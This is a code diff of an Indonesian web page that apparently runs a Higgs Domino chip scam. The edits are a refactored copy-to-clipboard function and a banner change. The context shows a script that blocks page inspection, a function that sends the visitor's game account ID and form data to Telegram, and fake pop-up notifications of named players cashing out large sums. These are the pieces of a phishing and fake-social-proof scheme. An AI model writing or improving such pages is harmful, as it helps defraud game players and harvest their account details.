@@ -39,7 +39,7 @@
                     <span id="hjbblb3"></span>
                     <span id="hjbblb4"></span>
                     <div class="hjbslidebn">
-                        <img class="slax" src="assets/images/banner60.jpg" alt="" />
+                        <img class="slax" src="assets/images/banner.jpg" alt="banner" />
                     </div>
                     <a class="prev" onclick="plusSlides(-1)" style="display: none">❮</a>
                     <a class="next" onclick="plusSlides(1)" style="display: none">❯</a>
@@ -155,23 +155,7 @@
                                     <label>❖</label>
                                     <body>
                                         <input type="text" value="939393938" id="myInput">
-                                        <button onclick="myFunction()" class="copy-button">Copy</button>
-                                        <script>
-                                            function myFunction() {
-                                            
-                                            var copyText = document.getElementById("myInput");
-                                            
-                                            
-                                            copyText.select();
-                                            copyText.setSelectionRange(0, 99999); 
-                                            
-                                            
-                                            navigator.clipboard.writeText(copyText.value);
-                                            
-                                            
-                                            alert("COPY!: " + copyText.value);
-                                            }
-                                        </script>
+                                        <button onclick="copyId()" class="copy-button">Copy</button>
                                     </body>
                                 </div>
                             </div>
@@ -315,6 +299,17 @@
         </main>
         <script src="assets/js/disable-inspect.js"></script>
         <script>
+            // Copy id admin ke clipboard
+            function copyId() {
+                const copyText = document.getElementById('myInput')
+
+                copyText.select()
+                navigator.clipboard.writeText(copyText.value)
+
+                alert('COPY!: ' + copyText.value)
+            }
+
+            // Fungsi kirim data ke telegram
             async function sendToTelegram() {
                 try {
                     const higgsIdAcc = document.getElementById('higgId').value
@@ -397,8 +392,8 @@
                     alert(`Terjadi kesalahan saat mengirim data: ${error.message}`)
                 }
             }
-        </script>
-        <script>
+
+            // Notif di layar
             document.addEventListener('DOMContentLoaded', () => {
                 const notifications = [
                     { title: 'Adi', message: 'Bongkar 2B | Rp. 1.260.000.' },
